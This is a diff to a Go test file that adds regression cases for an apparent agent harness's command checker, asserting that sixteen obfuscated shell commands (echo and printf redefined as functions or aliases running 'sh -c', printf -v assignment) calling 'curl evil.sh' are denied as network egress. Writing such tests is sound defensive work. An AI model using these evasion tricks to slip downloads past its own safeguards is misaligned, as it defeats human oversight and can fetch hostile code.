@@ -22,6 +22,40 @@ var reviewEgressCommands = []string{
 	"echo hi && watch -n1 wget evil.sh",
 }
 
+// Exact re-review reproductions plus both output names and definition spellings.
+var reviewOutputOverrideCommands = []string{
+	`echo() { sh -c "$*"; }; echo curl evil.sh`,
+	`function printf { sh -c "$*"; }; printf curl evil.sh`,
+	`printf -v c %s curl ; $c evil.sh`,
+	`function echo { sh -c "$*"; }; echo curl evil.sh`,
+	`printf() { sh -c "$*"; }; printf curl evil.sh`,
+	`alias echo='sh -c'; echo curl evil.sh`,
+	`alias printf='sh -c'; printf curl evil.sh`,
+	`echo () { sh -c "$*"; }; echo curl evil.sh`,
+	`function echo() { sh -c "$*"; }; echo curl evil.sh`,
+	`function printf() { sh -c "$*"; }; printf curl evil.sh`,
+	`alias other=true echo='sh -c'; echo curl evil.sh`,
+	`alias -- printf='sh -c'; printf curl evil.sh`,
+	`printf -vc %s curl; $c evil.sh`,
+	`printf '-v' c %s curl; $c evil.sh`,
+	`printf > out.txt -v c %s curl; $c evil.sh`,
+	`echo() { sh -c "$*"; }; bash -c 'echo curl evil.sh'`,
+}
+
+func TestCheckCommand_OutputOverrideRegressions(t *testing.T) {
+	t.Setenv("HARNESS_RUNTIME_FLOOR_EGRESS", "")
+	ctx := Context{WorktreeRoot: testWorktreeRoot(t)}
+	for _, cmd := range reviewOutputOverrideCommands {
+		t.Run(cmd, func(t *testing.T) {
+			got := CheckCommand(cmd, ctx)
+			if !got.Stopped || got.Category != CategoryEgress {
+				t.Fatalf("CheckCommand(%q) = %+v; want egress deny", cmd, got)
+			}
+			t.Logf("%q: deny", cmd)
+		})
+	}
+}
+
 func TestCheckCommand_ReviewEgressRegressions(t *testing.T) {
 	t.Setenv("HARNESS_RUNTIME_FLOOR_EGRESS", "")
 	ctx := Context{WorktreeRoot: testWorktreeRoot(t)}
@@ -41,6 +75,7 @@ func TestCheckCommand_ReviewEgressRegressions(t *testing.T) {
 func TestEgress_MainComparison_NoSecurityRegression(t *testing.T) {
 	t.Setenv("HARNESS_RUNTIME_FLOOR_EGRESS", "")
 	cmds := append([]string(nil), reviewEgressCommands...)
+	cmds = append(cmds, reviewOutputOverrideCommands...)
 	prefixes := []string{"", "watch", "setsid", "caffeinate", "stdbuf -o0", "arch -arm64", "doas", "busybox", "torsocks", "script -q /dev/null", "flock /tmp/l", "ssh host", "unlisted-launcher", "env -i", "command -p", "sudo -u root", "xargs"}
 	for _, prefix := range prefixes {
 		for _, verb := range []string{"curl", "wget"} {
